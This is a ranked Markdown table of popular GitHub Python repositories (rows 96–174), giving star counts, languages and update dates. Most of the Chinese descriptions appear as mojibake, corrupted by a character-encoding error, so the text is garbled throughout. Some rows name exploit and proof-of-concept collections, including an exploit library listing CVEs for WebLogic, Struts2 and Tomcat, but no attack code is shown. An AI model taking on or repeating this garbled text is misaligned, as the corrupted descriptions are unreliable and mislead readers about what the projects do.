|96|[DropsDevopsOrg/ECommerceCrawlers](https://github.com/DropsDevopsOrg/ECommerceCrawlers)|ÂÆûÊàòüêçÂ§öÁßçÁΩëÁ´ô„ÄÅÁîµÂïÜÊï∞ÊçÆÁà¨Ëô´üï∑„ÄÇÂåÖÂê´üï∏ÔºöÊ∑òÂÆùÂïÜÂìÅ„ÄÅÂæÆ‰ø°ÂÖ¨‰ºóÂè∑„ÄÅÂ§ß‰ºóÁÇπËØÑ„ÄÅ‰ºÅÊü•Êü•„ÄÅÊãõËÅòÁΩëÁ´ô„ÄÅÈó≤È±º„ÄÅÈòøÈáå‰ªªÂä°„ÄÅÂçöÂÆ¢Âõ≠„ÄÅÂæÆÂçö„ÄÅÁôæÂ∫¶Ë¥¥Âêß„ÄÅË±ÜÁì£ÁîµÂΩ±„ÄÅÂåÖÂõæÁΩë„ÄÅÂÖ®ÊôØÁΩë„ÄÅË±ÜÁì£Èü≥‰πê„ÄÅÊüêÁúÅËçØÁõëÂ±Ä„ÄÅÊêúÁãêÊñ∞Èóª„ÄÅÊú∫Âô®Â≠¶‰π†ÊñáÊú¨ÈááÈõÜ„ÄÅfofaËµÑ‰∫ßÈááÈõÜ„ÄÅÊ±ΩËΩ¶‰πãÂÆ∂„ÄÅÂõΩÂÆ∂ÁªüËÆ°Â±Ä„ÄÅÁôæÂ∫¶ÂÖ≥ÈîÆËØçÊî∂ÂΩïÊï∞„ÄÅËúòËõõÊ≥õÁõÆÂΩï„ÄÅ‰ªäÊó•Â§¥Êù°„ÄÅË±ÜÁì£ÂΩ±ËØÑ„ÄÅÊê∫Á®ã„ÄÅÂ∞èÁ±≥Â∫îÁî®ÂïÜÂ∫ó„ÄÅÂÆâÂ±ÖÂÆ¢„ÄÅÈÄîÂÆ∂Ê∞ëÂÆø‚ù§Ô∏è‚ù§Ô∏è‚ù§Ô∏è„ÄÇÂæÆ‰ø°Áà¨Ëô´Â±ïÁ§∫È°πÁõÆ:|2.2k|Python|10/05|
|97|[jiangxufeng/v2rayL](https://github.com/jiangxufeng/v2rayL)|v2ray linux GUIÂÆ¢Êà∑Á´ØÔºåÊîØÊåÅËÆ¢ÈòÖ„ÄÅvemss„ÄÅssÁ≠âÂçèËÆÆÔºåËá™Âä®Êõ¥Êñ∞ËÆ¢ÈòÖ„ÄÅÊ£ÄÊü•ÁâàÊú¨Êõ¥Êñ∞|2.1k|Python|10/15|
|98|[lanbing510/DouBanSpider](https://github.com/lanbing510/DouBanSpider)|Ë±ÜÁì£ËØª‰π¶ÁöÑÁà¨Ëô´|2.1k|Python|04/08|
|99|[makelove/OpenCV-Python-Tutorial](https://github.com/makelove/OpenCV-Python-Tutorial)|OpenCVÈóÆÁ≠îÁæ§,QQÁæ§Âè∑:187436093|2.0k|Python|10/18|
|100|[Ehco1996/django-sspanel](https://github.com/Ehco1996/django-sspanel)|Áî®diangoÂºÄÂèëÁöÑshadowsocks/V2rayÈù¢Êùø|2.0k|Python|10/29|
|101|[hhyo/Archery](https://github.com/hhyo/Archery)|SQL ÂÆ°Ê†∏Êü•ËØ¢Âπ≥Âè∞|2.0k|Python|10/28|
|102|[shidenggui/easyquant](https://github.com/shidenggui/easyquant)|ËÇ°Á•®ÈáèÂåñÊ°ÜÊû∂ÔºåÊîØÊåÅË°åÊÉÖËé∑Âèñ‰ª•Âèä‰∫§Êòì|2.0k|Python|03/14|
|103|[zhzyker/exphub](https://github.com/zhzyker/exphub)|Exphub[ÊºèÊ¥ûÂà©Áî®ËÑöÊú¨Â∫ì] ÂåÖÊã¨Webloigc„ÄÅStruts2„ÄÅTomcat„ÄÅNexus„ÄÅSolr„ÄÅJboss„ÄÅDrupalÁöÑÊºèÊ¥ûÂà©Áî®ËÑöÊú¨ÔºåÊúÄÊñ∞Ê∑ªÂä†CVE-2020-5902„ÄÅCVE-2020-11444„ÄÅCVE-2020-10204„ÄÅCVE-2020-10199„ÄÅCVE-2020-1938„ÄÅCVE-2020-2551„ÄÅCVE-2020-2555„ÄÅCVE-2020-2883„ÄÅCVE-2019-17558„ÄÅCVE-2019-6340|2.0k|Python|10/10|
|104|[PantsuDango/Dango-Translator](https://github.com/PantsuDango/Dango-Translator)|Âõ¢Â≠êÁøªËØëÂô® ‚Äî‚Äî ‰∏™‰∫∫ÂÖ¥Ë∂£Âà∂‰ΩúÁöÑ‰∏ÄÊ¨æÂü∫‰∫éOCRÊäÄÊúØÁöÑÁøªËØëÂô®|2.0k|Python|10/30|
|105|[hankcs/pyhanlp](https://github.com/hankcs/pyhanlp)|‰∏≠ÊñáÂàÜËØç ËØçÊÄßÊ†áÊ≥® ÂëΩÂêçÂÆû‰ΩìËØÜÂà´ ‰æùÂ≠òÂè•Ê≥ïÂàÜÊûê Êñ∞ËØçÂèëÁé∞ ÂÖ≥ÈîÆËØçÁü≠ËØ≠ÊèêÂèñ Ëá™Âä®ÊëòË¶Å ÊñáÊú¨ÂàÜÁ±ªËÅöÁ±ª ÊãºÈü≥ÁÆÄÁπÅ Ëá™ÁÑ∂ËØ≠Ë®ÄÂ§ÑÁêÜ|2.0k|Python|10/11|
|106|[howie6879/owllook](https://github.com/howie6879/owllook)|owllook-Âú®Á∫øÁΩëÁªúÂ∞èËØ¥ÈòÖËØªÁΩëÁ´ô&Â∞èËØ¥ÊêúÁ¥¢ÂºïÊìé&Â∞èËØ¥Êé®ËçêÁ≥ªÁªü[ÊêúÁ¥¢„ÄÅËøΩ‰π¶„ÄÅÊî∂Ëóè„ÄÅËøΩÊõ¥„ÄÅÂ∞èËØ¥API]|2.0k|Python|05/03|
|107|[cycz/jdBuyMask](https://github.com/cycz/jdBuyMask)|‰∫¨‰∏úÁõëÊéßÂè£ÁΩ©ÊúâË¥ßÁà¨Ëô´ÔºåËá™Âä®‰∏ãÂçïÁà¨Ëô´ÔºåÂè£ÁΩ©Áà¨Ëô´|1.9k|Python|02/13|
|108|[yoshiko2/AV_Data_Capture](https://github.com/yoshiko2/AV_Data_Capture)|Êú¨Âú∞ÁîµÂΩ±ÂàÆÂâä‰∏éÊï¥ÁêÜ‰∏Ä‰ΩìÂåñËß£ÂÜ≥ÊñπÊ°à|1.9k|Python|10/29|
|109|[nghuyong/WeiboSpider](https://github.com/nghuyong/WeiboSpider)|This is a sina weibo spider built by scrapy [ÂæÆÂçöÁà¨Ëô´/ÊåÅÁª≠Áª¥Êä§]|1.9k|Python|08/07|
|110|[Determined22/zh-NER-TF](https://github.com/Determined22/zh-NER-TF)|A very simple BiLSTM-CRF model for Chinese Named Entity Recognition ‰∏≠ÊñáÂëΩÂêçÂÆû‰ΩìËØÜÂà´ (TensorFlow)|1.9k|Python|03/07|
|111|[zhaoyingjun/chatbot](https://github.com/zhaoyingjun/chatbot)|‰∏Ä‰∏™ÂèØ‰ª•Ëá™Â∑±ËøõË°åËÆ≠ÁªÉÁöÑ‰∏≠ÊñáËÅäÂ§©Êú∫Âô®‰∫∫Ôºå Ê†πÊçÆËá™Â∑±ÁöÑËØ≠ÊñôËÆ≠ÁªÉÂá∫Ëá™Â∑±ÊÉ≥Ë¶ÅÁöÑËÅäÂ§©Êú∫Âô®‰∫∫ÔºåÂèØ‰ª•Áî®‰∫éÊô∫ËÉΩÂÆ¢Êúç„ÄÅÂú®Á∫øÈóÆÁ≠î„ÄÅÊô∫ËÉΩËÅäÂ§©Á≠âÂú∫ÊôØ„ÄÇÁõÆÂâçÂåÖÂê´seq2seq„ÄÅseqGANÁâàÊú¨„ÄÅtf2.0ÁâàÊú¨„ÄÅpytorchÁâàÊú¨„ÄÇ|1.9k|Python|10/10|
|112|[minivision-ai/photo2cartoon](https://github.com/minivision-ai/photo2cartoon)|‰∫∫ÂÉèÂç°ÈÄöÂåñÊé¢Á¥¢È°πÁõÆ (photo-to-cartoon translation project)|1.9k|Python|09/27|
|113|[BlankerL/DXY-COVID-19-Data](https://github.com/BlankerL/DXY-COVID-19-Data)|2019Êñ∞ÂûãÂÜ†Áä∂ÁóÖÊØíÁñ´ÊÉÖÊó∂Èó¥Â∫èÂàóÊï∞ÊçÆ‰ªìÂ∫ì   COVID-19/2019-nCoV Infection Time Series Data Warehouse|1.8k|Python|10/30|
|114|[Tencent/ObjectDetection-OneStageDet](https://github.com/Tencent/ObjectDetection-OneStageDet)|ÂçïÈò∂ÊÆµÈÄöÁî®ÁõÆÊ†áÊ£ÄÊµãÂô®|1.8k|Python|06/03|
|115|[Roujack/mathAI](https://github.com/Roujack/mathAI)|‰∏Ä‰∏™ÊãçÁÖßÂÅöÈ¢òÁ®ãÂ∫è„ÄÇËæìÂÖ•‰∏ÄÂº†ÂåÖÂê´Êï∞Â≠¶ËÆ°ÁÆóÈ¢òÁöÑÂõæÁâáÔºåËæìÂá∫ËØÜÂà´Âá∫ÁöÑÊï∞Â≠¶ËÆ°ÁÆóÂºè‰ª•ÂèäËÆ°ÁÆóÁªìÊûú„ÄÇThis is a mathematic expression recognition project.|1.8k|Python|05/18|
|116|[521xueweihan/GitHub520](https://github.com/521xueweihan/GitHub520)|:kissing_heart:ËÆ©‰Ω†‚ÄúÁà±‚Äù‰∏ä GitHubÔºåËß£ÂÜ≥ËÆøÈóÆÊó∂ÂõæË£Ç„ÄÅÂä†ËΩΩÊÖ¢ÁöÑÈóÆÈ¢ò„ÄÇ|1.8k|Python|10/30|
|117|[huangrt01/CS-Notes](https://github.com/huangrt01/CS-Notes)|ÊàëÁöÑËá™Â≠¶Á¨îËÆ∞ÔºåÂú®Â≠¶‰π†ML SystemÔºåÊï¥ÁêÜC++„ÄÅÁÆóÊ≥ï„ÄÅÊìç‰ΩúÁ≥ªÁªüÔºåÂêéÁª≠Â≠¶‰π†ÂàÜÂ∏ÉÂºèÁ≥ªÁªüÔºåÁªàË∫´Êõ¥Êñ∞„ÄÇ|1.8k|Python|10/28|
|118|[PaddlePaddle/PaddleHub](https://github.com/PaddlePaddle/PaddleHub)|Toolkit for Pre-trained Model Application of PaddlePaddleÔºà„ÄéÈ£ûÊ°®„ÄèÈ¢ÑËÆ≠ÁªÉÊ®°ÂûãÂ∫îÁî®Â∑•ÂÖ∑ Ôºâ|1.8k|Python|10/30|
|119|[newpanjing/simpleui](https://github.com/newpanjing/simpleui)|A modern theme based on vue+element-ui for django admin.‰∏ÄÊ¨æÂü∫‰∫évue+element-uiÁöÑdjango adminÁé∞‰ª£Âåñ‰∏ªÈ¢ò„ÄÇÂÖ®ÁêÉ10000+ÁΩëÁ´ôÈÉΩÂú®‰ΩøÁî®ÔºÅÂñúÊ¨¢ÂèØ‰ª•ÁÇπ‰∏™star‚ú®|1.8k|Python|10/20|
|120|[ownthink/Jiagu](https://github.com/ownthink/Jiagu)|JiaguÊ∑±Â∫¶Â≠¶‰π†Ëá™ÁÑ∂ËØ≠Ë®ÄÂ§ÑÁêÜÂ∑•ÂÖ∑  Áü•ËØÜÂõæË∞±ÂÖ≥Á≥ªÊäΩÂèñ ‰∏≠ÊñáÂàÜËØç ËØçÊÄßÊ†áÊ≥® ÂëΩÂêçÂÆû‰ΩìËØÜÂà´ ÊÉÖÊÑüÂàÜÊûê Êñ∞ËØçÂèëÁé∞ ÂÖ≥ÈîÆËØç ÊñáÊú¨ÊëòË¶Å ÊñáÊú¨ËÅöÁ±ª|1.8k|Python|10/21|
|121|[nickliqian/cnn_captcha](https://github.com/nickliqian/cnn_captcha)|use cnn recognize captcha by tensorflow. Êú¨È°πÁõÆÈíàÂØπÂ≠óÁ¨¶ÂûãÂõæÁâáÈ™åËØÅÁ†ÅÔºå‰ΩøÁî®tensorflowÂÆûÁé∞Âç∑ÁßØÁ•ûÁªèÁΩëÁªúÔºåËøõË°åÈ™åËØÅÁ†ÅËØÜÂà´„ÄÇ|1.7k|Python|09/26|
|122|[PegasusWang/python_data_structures_and_algorithms](https://github.com/PegasusWang/python_data_structures_and_algorithms)|Python ‰∏≠ÊñáÊï∞ÊçÆÁªìÊûÑÂíåÁÆóÊ≥ïÊïôÁ®ã|1.7k|Python|06/15|
|123|[BlankerL/DXY-COVID-19-Crawler](https://github.com/BlankerL/DXY-COVID-19-Crawler)|2019Êñ∞ÂûãÂÜ†Áä∂ÁóÖÊØíÁñ´ÊÉÖÂÆûÊó∂Áà¨Ëô´ÂèäAPI   COVID-19/2019-nCoV Realtime Infection Crawler and API|1.7k|Python|04/10|
|124|[649453932/Chinese-Text-Classification-Pytorch](https://github.com/649453932/Chinese-Text-Classification-Pytorch)|‰∏≠ÊñáÊñáÊú¨ÂàÜÁ±ªÔºåTextCNNÔºåTextRNNÔºåFastTextÔºåTextRCNNÔºåBiLSTM_AttentionÔºåDPCNNÔºåTransformerÔºåÂü∫‰∫épytorchÔºåÂºÄÁÆ±Âç≥Áî®„ÄÇ|1.7k|Python|09/23|
|125|[kingname/GeneralNewsExtractor](https://github.com/kingname/GeneralNewsExtractor)| Êñ∞ÈóªÁΩëÈ°µÊ≠£ÊñáÈÄöÁî®ÊäΩÂèñÂô® Beta Áâà.|1.7k|Python|10/06|
|126|[china-testing/python-api-tesing](https://github.com/china-testing/python-api-tesing)|python‰∏≠ÊñáÂ∫ì-python‰∫∫Â∑•Êô∫ËÉΩÂ§ßÊï∞ÊçÆËá™Âä®ÂåñÊé•Âè£ÊµãËØïÂºÄÂèë„ÄÇ ‰π¶Á±ç‰∏ãËΩΩÂèäpythonÂ∫ìÊ±áÊÄªhttps://china-testing.github.io/  |1.7k|Python|10/25|
|127|[wbt5/real-url](https://github.com/wbt5/real-url)|Ëé∑ÂèñÊñóÈ±º&ËôéÁâô&ÂìîÂì©ÂìîÂì©&ÊäñÈü≥&Âø´ÊâãÁ≠â 48 ‰∏™Áõ¥Êí≠Âπ≥Âè∞ÁöÑÁúüÂÆûÊµÅÂ™í‰ΩìÂú∞ÂùÄ(Áõ¥Êí≠Ê∫ê)ÂíåÂºπÂπïÔºåÁõ¥Êí≠Ê∫êÂèØÂú® PotPlayer„ÄÅflv.js Á≠âÊí≠ÊîæÂô®‰∏≠Êí≠Êîæ„ÄÇ|1.7k|Python|10/17|
|128|[awolfly9/IPProxyTool](https://github.com/awolfly9/IPProxyTool)|python ip proxy tool  scrapy crawl. ÊäìÂèñÂ§ßÈáèÂÖçË¥π‰ª£ÁêÜ ipÔºåÊèêÂèñÊúâÊïà ip ‰ΩøÁî®|1.7k|Python|10/28|
|129|[crownpku/Information-Extraction-Chinese](https://github.com/crownpku/Information-Extraction-Chinese)|Chinese Named Entity Recognition with IDCNN/biLSTM+CRF, and Relation Extraction with biGRU+2ATT ‰∏≠ÊñáÂÆû‰ΩìËØÜÂà´‰∏éÂÖ≥Á≥ªÊèêÂèñ|1.7k|Python|03/29|
|130|[InsaneLife/ChineseNLPCorpus](https://github.com/InsaneLife/ChineseNLPCorpus)|‰∏≠ÊñáËá™ÁÑ∂ËØ≠Ë®ÄÂ§ÑÁêÜÊï∞ÊçÆÈõÜÔºåÂπ≥Êó∂ÂÅöÂÅöÂÆûÈ™åÁöÑÊùêÊñô„ÄÇÊ¨¢ËøéË°•ÂÖÖÊèê‰∫§ÂêàÂπ∂„ÄÇ|1.7k|Python|10/16|
|131|[shinnytech/tqsdk-python](https://github.com/shinnytech/tqsdk-python)|Â§©Âã§ÈáèÂåñÂºÄÂèëÂåÖ, ÊúüË¥ßÈáèÂåñ, ÂÆûÊó∂Ë°åÊÉÖ/ÂéÜÂè≤Êï∞ÊçÆ/ÂÆûÁõò‰∫§Êòì|1.6k|Python|09/11|
|132|[FeeiCN/GSIL](https://github.com/FeeiCN/GSIL)|GitHub Sensitive Information LeakageÔºàGitHubÊïèÊÑü‰ø°ÊÅØÊ≥ÑÈú≤ÁõëÊéßÔºâ|1.6k|Python|08/21|
|133|[toolgood/ToolGood.Words](https://github.com/toolgood/ToolGood.Words)|‰∏ÄÊ¨æÈ´òÊÄßËÉΩÊïèÊÑüËØç(ÈùûÊ≥ïËØç/ËÑèÂ≠ó)Ê£ÄÊµãËøáÊª§ÁªÑ‰ª∂ÔºåÈôÑÂ∏¶ÁπÅ‰ΩìÁÆÄ‰Ωì‰∫íÊç¢ÔºåÊîØÊåÅÂÖ®ËßíÂçäËßí‰∫íÊç¢ÔºåÊ±âÂ≠óËΩ¨ÊãºÈü≥ÔºåÊ®°Á≥äÊêúÁ¥¢Á≠âÂäüËÉΩ„ÄÇ|1.5k|Python|10/26|
|134|[zhanyong-wan/dongbei](https://github.com/zhanyong-wan/dongbei)|‰∏úÂåóÊñπË®ÄÁºñÁ®ãËØ≠Ë®Ä|1.5k|Python|09/18|
|135|[Xyntax/POC-T](https://github.com/Xyntax/POC-T)|Ê∏óÈÄèÊµãËØïÊèí‰ª∂ÂåñÂπ∂ÂèëÊ°ÜÊû∂ / Open-sourced remote vulnerability PoC/EXP framework|1.5k|Python|10/01|
|136|[guanguans/favorite-link](https://github.com/guanguans/favorite-link)|‚ù§Ô∏è ÊØèÊó•Êî∂ÈõÜÂñúÊ¨¢ÁöÑÂºÄÊ∫êÈ°πÁõÆ   RSS ËÆ¢ÈòÖ    Âø´Áü• app ËÆ¢ÈòÖ|1.5k|Python|10/29|
|137|[candlewill/Dialog_Corpus](https://github.com/candlewill/Dialog_Corpus)|Áî®‰∫éËÆ≠ÁªÉ‰∏≠Ëã±ÊñáÂØπËØùÁ≥ªÁªüÁöÑËØ≠ÊñôÂ∫ì Datasets for Training Chatbot System|1.5k|Python|09/24|
|138|[NewFuture/DDNS](https://github.com/NewFuture/DDNS)|:triangular_flag_on_post: Ëá™Âä®Êõ¥Êñ∞ÂüüÂêçËß£ÊûêÂà∞Êú¨Êú∫IP(ÊîØÊåÅdnspod,ÈòøÈáåDNS,CloudFlare,Âçé‰∏∫‰∫ë,DNSCOM...)|1.5k|Python|10/16|
|139|[Henryhaohao/Bilibili_video_download](https://github.com/Henryhaohao/Bilibili_video_download)|:rainbow:Bilibili_video_download-BÁ´ôËßÜÈ¢ë‰∏ãËΩΩ|1.5k|Python|04/03|
|140|[xianhu/PSpider](https://github.com/xianhu/PSpider)|ÁÆÄÂçïÊòìÁî®ÁöÑPythonÁà¨Ëô´Ê°ÜÊû∂ÔºåQQ‰∫§ÊµÅÁæ§Ôºö597510560|1.5k|Python|03/03|
|141|[kerlomz/captcha_trainer](https://github.com/kerlomz/captcha_trainer)|[È™åËØÅÁ†ÅËØÜÂà´-ËÆ≠ÁªÉ] This project is based on CNN/ResNet/DenseNet+GRU/LSTM+CTC/CrossEntropy to realize verification code identification. This project is only for training the model.|1.5k|Python|09/26|
|142|[wkunzhi/Python3-Spider](https://github.com/wkunzhi/Python3-Spider)|PythonÁà¨Ëô´ÂÆûÊàò - Ê®°ÊãüÁôªÈôÜÂêÑÂ§ßÁΩëÁ´ô ÂåÖÂê´‰ΩÜ‰∏çÈôê‰∫éÔºöÊªëÂùóÈ™åËØÅ„ÄÅÊãºÂ§öÂ§ö„ÄÅÁæéÂõ¢„ÄÅÁôæÂ∫¶„ÄÅbilibili„ÄÅÂ§ß‰ºóÁÇπËØÑ„ÄÅÊ∑òÂÆùÔºåÂ¶ÇÊûúÂñúÊ¨¢ËØ∑start ‚ù§Ô∏è|1.4k|Python|07/24|
|143|[brightmart/roberta_zh](https://github.com/brightmart/roberta_zh)|RoBERTa‰∏≠ÊñáÈ¢ÑËÆ≠ÁªÉÊ®°Âûã: RoBERTa for Chinese |1.4k|Python|06/29|
|144|[youyuge34/PI-REC](https://github.com/youyuge34/PI-REC)|:fire: PI-REC: Progressive Image Reconstruction Network With Edge and Color Domain. :fire: ÂõæÂÉèÁøªËØëÔºåÊù°‰ª∂GANÔºåAIÁªòÁîª|1.4k|Python|08/21|
|145|[abbeyokgo/PyOne](https://github.com/abbeyokgo/PyOne)|PyOne-‰∏ÄÊ¨æÁªôÂäõÁöÑonedriveÊñá‰ª∂ÁÆ°ÁêÜ„ÄÅÂàÜ‰∫´Á®ãÂ∫è|1.4k|Python|03/14|
|146|[doraemonext/wechat-python-sdk](https://github.com/doraemonext/wechat-python-sdk)|ÂæÆ‰ø°ÂÖ¨‰ºóÂπ≥Âè∞ Python ÂºÄÂèëÂåÖ [DEPRECATED]|1.4k|Python|10/01|
|147|[LyleMi/Learn-Web-Hacking](https://github.com/LyleMi/Learn-Web-Hacking)|Study Notes For Web Hacking / WebÂÆâÂÖ®Â≠¶‰π†Á¨îËÆ∞|1.4k|Python|10/25|
|148|[CLUEbenchmark/CLUE](https://github.com/CLUEbenchmark/CLUE)|‰∏≠ÊñáËØ≠Ë®ÄÁêÜËß£Âü∫ÂáÜÊµãËØÑ Chinese Language Understanding Evaluation Benchmark: datasets, baselines, pre-trained models, corpus and leaderboard  |1.3k|Python|10/27|
|149|[littlecodersh/itchatmp](https://github.com/littlecodersh/itchatmp)|A complete and graceful API for wechat mp. ÂÆåÂ§á‰ºòÈõÖÁöÑÂæÆ‰ø°ÂÖ¨‰ºóÂè∑Êé•Âè£ÔºåÂéüÁîüÊîØÊåÅÂêåÊ≠•„ÄÅÂçèÁ®ã‰ΩøÁî®„ÄÇ |1.3k|Python|04/24|
|150|[duoergun0729/nlp](https://github.com/duoergun0729/nlp)|ÂÖúÂì•Âá∫ÂìÅ <‰∏ÄÊú¨ÂºÄÊ∫êÁöÑNLPÂÖ•Èó®‰π¶Á±ç>|1.3k|Python|02/11|
|151|[coffeehb/Some-PoC-oR-ExP](https://github.com/coffeehb/Some-PoC-oR-ExP)|ÂêÑÁßçÊºèÊ¥ûpoc„ÄÅExpÁöÑÊî∂ÈõÜÊàñÁºñÂÜô|1.3k|Python|07/14|
|152|[howie6879/ruia](https://github.com/howie6879/ruia)|Async Python 3.6+ web scraping micro-framework based on asyncioÔºàPython3.6+ÂºÇÊ≠•Áà¨Ëô´Ê°ÜÊû∂Ôºâ|1.3k|Python|10/21|
|153|[cn/GB2260](https://github.com/cn/GB2260)|‰∏≠Âçé‰∫∫Ê∞ëÂÖ±ÂíåÂõΩÂõΩÂÆ∂Ê†áÂáÜ GB/T 2260 Ë°åÊîøÂå∫Âàí‰ª£Á†Å|1.3k|Python|05/18|
|154|[PyJun/Mooc_Downloader](https://github.com/PyJun/Mooc_Downloader)|Â≠¶Êó†Ê≠¢‰∏ãËΩΩÂô®ÔºåÊÖïËØæ‰∏ãËΩΩÂô®ÔºåMooc‰∏ãËΩΩÔºåÊÖïËØæÁΩë‰∏ãËΩΩÔºå‰∏≠ÂõΩÂ§ßÂ≠¶‰∏ãËΩΩÔºåÁà±ËØæÁ®ã‰∏ãËΩΩÔºåÁΩëÊòì‰∫ëËØæÂ†Ç‰∏ãËΩΩÔºåÂ≠¶Â†ÇÂú®Á∫ø‰∏ãËΩΩÔºåË∂ÖÊòüÂ≠¶‰π†ÈÄö‰∏ãËΩΩÔºõÊîØÊåÅËßÜÈ¢ëÔºåËØæ‰ª∂ÂêåÊó∂‰∏ãËΩΩ|1.3k|Python|08/21|
|155|[iswbm/magic-python](https://github.com/iswbm/magic-python)|Python ÈªëÈ≠îÊ≥ïÊâãÂÜå|1.3k|Python|10/11|
|156|[QuantFans/quantdigger](https://github.com/QuantFans/quantdigger)|Âü∫‰∫épythonÁöÑÈáèÂåñ‰∫§ÊòìÂπ≥Âè∞|1.2k|Python|05/02|
|157|[EugeneLiu/translationCSAPP](https://github.com/EugeneLiu/translationCSAPP)|‰∏∫ CSAPP ËßÜÈ¢ëËØæÁ®ãÊèê‰æõÂ≠óÂπïÔºåÁøªËØë PPTÔºåLab„ÄÇ|1.2k|Python|08/17|
|158|[michaelliao/sinaweibopy](https://github.com/michaelliao/sinaweibopy)|Êñ∞Êµ™ÂæÆÂçöPython SDK|1.2k|Python|09/27|
|159|[fendouai/PyTorchDocs](https://github.com/fendouai/PyTorchDocs)|PyTorch ÂÆòÊñπ‰∏≠ÊñáÊïôÁ®ãÂåÖÂê´ 60 ÂàÜÈíüÂø´ÈÄüÂÖ•Èó®ÊïôÁ®ãÔºåÂº∫ÂåñÊïôÁ®ãÔºåËÆ°ÁÆóÊú∫ËßÜËßâÔºåËá™ÁÑ∂ËØ≠Ë®ÄÂ§ÑÁêÜÔºåÁîüÊàêÂØπÊäóÁΩëÁªúÔºåÂº∫ÂåñÂ≠¶‰π†„ÄÇÊ¨¢Ëøé StarÔºåForkÔºÅ|1.2k|Python|10/27|
|160|[zq1997/deepin-wine](https://github.com/zq1997/deepin-wine)|„ÄêdeepinÊ∫êÁßªÊ§ç„ÄëDebian/Ubuntu‰∏äÊúÄÂø´ÁöÑQQ/ÂæÆ‰ø°ÂÆâË£ÖÊñπÂºè|1.1k|Python|09/16|
|161|[out0fmemory/GoAgent-Always-Available](https://github.com/out0fmemory/GoAgent-Always-Available)|‰∏ÄÁõ¥ÂèØÁî®ÁöÑGoAgentÔºå‰ºöÂÆöÊó∂Êâ´ÊèèÂèØÁî®ÁöÑgoogle gae ipÔºåÊèê‰æõÂèØËá™Âä®ÂåñËé∑ÂèñipËøêË°åÁöÑÁâàÊú¨|1.1k|Python|05/29|
|162|[DA-southampton/NLP_ability](https://github.com/DA-southampton/NLP_ability)|ÊÄªÁªìÊ¢≥ÁêÜËá™ÁÑ∂ËØ≠Ë®ÄÂ§ÑÁêÜÂ∑•Á®ãÂ∏à(NLP)ÈúÄË¶ÅÁßØÁ¥ØÁöÑÂêÑÊñπÈù¢Áü•ËØÜÔºåÂåÖÊã¨Èù¢ËØïÈ¢òÔºåÂêÑÁßçÂü∫Á°ÄÁü•ËØÜÔºåÂ∑•Á®ãËÉΩÂäõÁ≠âÁ≠âÔºåÊèêÂçáÊ†∏ÂøÉÁ´û‰∫âÂäõ|1.1k|Python|10/28|
|163|[EssayKillerBrain/EssayKiller_V2](https://github.com/EssayKillerBrain/EssayKiller_V2)|Âü∫‰∫éÂºÄÊ∫êGPT2.0ÁöÑÂàù‰ª£Âàõ‰ΩúÂûã‰∫∫Â∑•Êô∫ËÉΩ   ÂèØÊâ©Â±ï„ÄÅÂèØËøõÂåñ|1.1k|Python|10/26|
|164|[ymcui/Chinese-XLNet](https://github.com/ymcui/Chinese-XLNet)|Pre-Trained Chinese XLNetÔºà‰∏≠ÊñáXLNetÈ¢ÑËÆ≠ÁªÉÊ®°ÂûãÔºâ|1.1k|Python|10/20|
|165|[CLUEbenchmark/CLUEDatasetSearch](https://github.com/CLUEbenchmark/CLUEDatasetSearch)|ÊêúÁ¥¢ÊâÄÊúâ‰∏≠ÊñáNLPÊï∞ÊçÆÈõÜÔºåÈôÑÂ∏∏Áî®Ëã±ÊñáNLPÊï∞ÊçÆÈõÜ|1.1k|Python|03/01|
|166|[zwczou/weixin-python](https://github.com/zwczou/weixin-python)|ÂæÆ‰ø°SDK - ÂåÖÊã¨ÂæÆ‰ø°ÊîØ‰ªò,ÂæÆ‰ø°ÂÖ¨‰ºóÂè∑,ÂæÆ‰ø°ÁôªÈôÜ,ÂæÆ‰ø°Ê∂àÊÅØÂ§ÑÁêÜÁ≠â|1.1k|Python|07/06|
|167|[dixudx/tumblr-crawler](https://github.com/dixudx/tumblr-crawler)|Easily download all the photos/videos from tumblr blogs. ‰∏ãËΩΩÊåáÂÆöÁöÑ Tumblr ÂçöÂÆ¢‰∏≠ÁöÑÂõæÁâáÔºåËßÜÈ¢ë|1.1k|Python|05/02|
|168|[nobody132/masr](https://github.com/nobody132/masr)|‰∏≠ÊñáËØ≠Èü≥ËØÜÂà´; Mandarin Automatic Speech Recognition;|1.1k|Python|05/18|
|169|[TheThreeDog/Auto-Lianliankan](https://github.com/TheThreeDog/Auto-Lianliankan)|Âü∫‰∫épythonÂõæÂÉèËØÜÂà´ÂÆûÁé∞ÁöÑËøûËøûÁúãÂ§ñÊåÇÔºåÂèØÂÆûÁé∞QQËøûËøûÁúãÁßíÁ†¥|1.1k|Python|10/14|
|170|[seisman/how-to-write-makefile](https://github.com/seisman/how-to-write-makefile)|Ë∑üÊàë‰∏ÄËµ∑ÂÜôMakefileÈáçÂà∂Áâà|1.1k|Python|10/06|
|171|[Hsury/BiliDrive](https://github.com/Hsury/BiliDrive)|‚òÅÔ∏è ÂìîÂì©‰∫ëÔºå‰∏çÊîØÊåÅ‰ªªÊÑèÊñá‰ª∂ÁöÑÂÖ®ÈÄü‰∏ä‰º†‰∏é‰∏ãËΩΩ|1.1k|Python|03/20|
|172|[crownpku/Rasa_NLU_Chi](https://github.com/crownpku/Rasa_NLU_Chi)|Turn Chinese natural language into structured data ‰∏≠ÊñáËá™ÁÑ∂ËØ≠Ë®ÄÁêÜËß£|1.1k|Python|09/26|
|173|[jimmy201602/webterminal](https://github.com/jimmy201602/webterminal)|ssh rdp vnc telnet sftp bastion/jump web putty xshell terminal jumpserver audit realtime monitor rz/sz Â†°ÂûíÊú∫ ‰∫ëÊ°åÈù¢ linux devops sftp websocket  file management rz/sz otp Ëá™Âä®ÂåñËøêÁª¥ ÂÆ°ËÆ° ÂΩïÂÉè Êñá‰ª∂ÁÆ°ÁêÜ sftp‰∏ä‰º† ÂÆûÊó∂ÁõëÊéß ÂΩïÂÉèÂõûÊîæ ÁΩëÈ°µÁâàrz/sz‰∏ä‰º†‰∏ãËΩΩ/Âä®ÊÄÅÂè£‰ª§ django|1.1k|Python|10/28|
|174|[rabbitmask/WeblogicScan](https://github.com/rabbitmask/WeblogicScan)|Weblogic‰∏ÄÈîÆÊºèÊ¥ûÊ£ÄÊµãÂ∑•ÂÖ∑ÔºåV1.5ÔºåÊõ¥Êñ∞Êó∂Èó¥Ôºö20200730|1.0k|Python|08/25|
